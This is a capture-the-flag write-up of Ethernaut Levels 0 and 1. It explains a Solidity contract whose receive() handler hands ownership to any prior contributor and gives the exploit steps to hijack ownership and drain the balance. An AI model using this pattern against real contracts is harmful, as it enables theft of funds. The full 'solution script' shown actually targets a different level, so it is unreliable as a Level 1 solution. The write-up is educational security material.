---

title: Ethernaut Challenge Series Part- 1
date: '2025-04-23'
tags: ['Ethernaut', 'Solidity', 'Smart Contract Hacking', 'Foundry']
draft: false
summary: Exploit a smart contract by hijacking ownership through its fallback mechanism.

---
Welcome to my writeup series on **Ethernaut**, the Web3 security wargame built by OpenZeppelin.

This series isn’t just about solving challenges — it’s about understanding the *why* behind each vulnerability. Whether you’re just getting into smart contract security or trying to think more offensively, I’m walking through every level with a clear breakdown of the logic, the exploit path, and the subtle bugs hiding in plain sight.

For these challenges, I’ve set up Ethernaut locally on my machine and I’m using **Foundry** to solve the challenges. It helps keep things snappy and lets debug and learn in a more hands-on way. I’m not writing this as an expert. I’m learning as I go — trying to understand the logic behind these contracts, spot what’s off, and share that process in a way that’s approachable.

# Level 0 – Hello Ethernaut

*starting small, learning steady*

This is where the journey begins.

Ethernaut Level 0 isn’t really about hacking — it’s more like a handshake between you and the game. You deploy an instance, interact with a smart contract, and mark the level as complete. Nothing fancy. But it sets up the environment and flow you’ll be using throughout the rest of the levels.
To begin, deploy the **Ethernaut** instance on your local setup. For this level, **you don’t have direct access to the contract's code** yet. Instead, you'll need to solve the challenge using your browser's **developer tools** — press **Ctrl+Shift+I** to open them. This will allow you to interact directly with the contract’s functions and see what's happening under the hood.
Once the contract is deployed, Ethernaut injects the `contract` object into the console. You don’t need to manually find the ABI or create the object yourself — it’s already there for you. Now, use the console to explore the contract by calling its functions:

```solidity
await contract.info()
await contract.info1()
await contract.info2("hello")
await contract.info42()
await contract.theMethodName()
await contract.password()
await contract.authenticate("ethernaut0") // wait for the transaction to complete
await contract.getCleared()
```

Each of these gives you a little clue — they’re basically breadcrumbs leading you to the password. Once you pass the right string into `authenticate()`, you’re good to go. `getCleared()` will return `true`, and you’ll be able to complete the level by just submitting the instance.

---

# Level 1 - Fallback

*take control, take the funds*

Moving to Level 1 — a bigger leap than the initial handshake. The goal? Claim the ownership of the contract and drain its balance to zero. This time, we’ve got the actual Solidity code, so it’s time to get surgical.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
```

The core vulnerability? It all revolves around how the contract handles **contributions**, and more importantly, what happens when you send ether without calling any specific function. How? Let’s walk through this step-by-step.

The contract keeps track of who sent how much using a `mapping(address => uint256)` called `contributions`. It also stores the current `owner`, who starts off as the contract deployer
and is credited with `1000 ether` (spoiler: not real ether, just a high value for comparison). If you look at the `contribute()` function, it seems innocent enough — you can send less than 0.001 ether, and your contribution gets logged. But there’s a catch: if your total contribution exceeds that of the current owner, you become the new one.

Sounds like you’d need to send over 1000 ether to win? Not quite. Here’s where the twist comes in.

There’s a `receive()` function — and that’s where the vulnerability lies. This function is automatically triggered when someone sends ether **directly** to the contract without any function call. The logic in there says: if you’ve contributed before (`contributions[msg.sender] > 0`) and you send some ether (`msg.value > 0`), then *boom*, you're the owner.

so here’s the line of code that flips the entire contract on its head:

```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
```

### What is `receive()`?

In Solidity, the `receive()` function is a **low-level fallback**, triggered automatically when ether is sent to the contract **without calldata** — that is, when someone sends ether without specifying any function to call.Think of it as the contract’s default ether handler.

For example:

```solidity

(bool success, ) = address(contract).call{value: 1 ether}("");
```

That line above doesn’t call any function — it just sends ether. And if the contract has a `receive()` function, it’ll get triggered. No `msg.data`, no function name — just ether.

So, what does the contract do when this `receive()` function gets triggered?

```solidity

require(msg.value > 0 && contributions[msg.sender] > 0);
```

This checks two things:

1. You must be sending some ether (i.e., `msg.value > 0`).
2. You must have already contributed **something** before (i.e., `contributions[msg.sender] > 0`).

If both conditions pass…

```solidity

owner = msg.sender;
```

That’s it. You're the new owner. No vote. No override protection. Just a plain assignment of power. This is what makes the contract vulnerable.

### Why is this Dangerous?

Because the `receive()` function is **meant to be passive**. It’s designed to let contracts accept funds quietly without interfering with their state too much. But here, it’s not just accepting ether — it’s making a **critical state change**: assigning **ownership**.

This means that **anyone** who has made even a tiny contribution (literally 1 wei), can simply send another small ether transfer directly and instantly become the contract owner — regardless of how much the current owner contributed.

It’s like a doorman letting you into a vault just because you donated a penny earlier.

### Why It Happens

The intention behind this design might have been to reward contributors who actively send ether — but the implementation failed to consider:

- **How low the bar is for `contributions[msg.sender] > 0`**
- The fact that `receive()` can be triggered outside the normal function call flow
- And most importantly, that assigning ownership should **never** happen inside such a loosely guarded function

Way too much theory, let’s begin the actual exploit. I’m writing the solution using Foundry, setting up a script that will execute the entire attack in one clean sweep.

We start by importing the original contract and setting the target instance manually using its deployed address

```solidity

level1 = Fallback(payable(0x7ab4C4804197531f7ed6A6bc0f0781f706ff7953));
```

This connects us to the vulnerable contract instance deployed at the provided address. Now, to pull off the exploit, we just follow three simple moves:

1. Contribute a tiny amount.
2. Trigger the `receive()` function.
3. Withdraw all the funds.

Here is the Solution Script

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Script, console} from "forge-std/Script.sol";
import {Fallout} from "../src/Fallout.sol";

contract FalloutSolution is Script {
    Fallout public level2;
    function setUp() external {
        level2 = Fallout(payable(0x8dAF17A20c9DBA35f005b6324F493785D239719d));
    }

    function run() external{

    uint256 privatekey = vm.envUint("PRIVATE_KEY");
    vm.startBroadcast(privatekey);
    console.log("Owner's address: ", level2.owner());
    level2.Fal1out();
    console.log("New owner's address: ", level2.owner());
    vm.stopBroadcast();
    }
}
```

---

### Step 1 – Make a Small Contribution

```solidity
level1.contribute{value: 1 wei}();
```

This is the only requirement to satisfy the `receive()` function. It adds our address to the `contributions` mapping with a non-zero amount, unlocking the gateway. We deliberately contribute a tiny amount (`1 wei`) to keep it minimal.

---

### Step 2 – Trigger `receive()` and Become Owner

```solidity
(bool success,) = payable(address(level1)).call{value: 1 wei}("");
```

This line is the real magic. We're sending ether directly **without any data**, so the `receive()` function is triggered. Since we already contributed in the previous step, the condition inside `receive()` passes:

```solidity
require(msg.value > 0 && contributions[msg.sender] > 0);
```

Boom — the contract hands over ownership to us.

```solidity
owner = msg.sender;
```

With 2 wei and 2 lines, we’ve hijacked the contract.

---

### Step 3 – Drain the Funds

```solidity
level1.withdraw();
```

We’re now the owner — and the `withdraw()` function is locked behind the `onlyOwner` modifier. Since we passed that hurdle, we invoke `withdraw()` and clean out the contract balance.

Here’s the catch: this isn’t just about funds — it’s about *ownership*. The vulnerability lies in how loosely the contract defines "trust" — a single contribution and an ether ping shouldn’t be enough to claim control, but here, it is.

Your takeaway as a smart contract dev? Always **separate critical logic from low-level fallback and receive handlers**, and never assign privileges based on unguarded conditions.
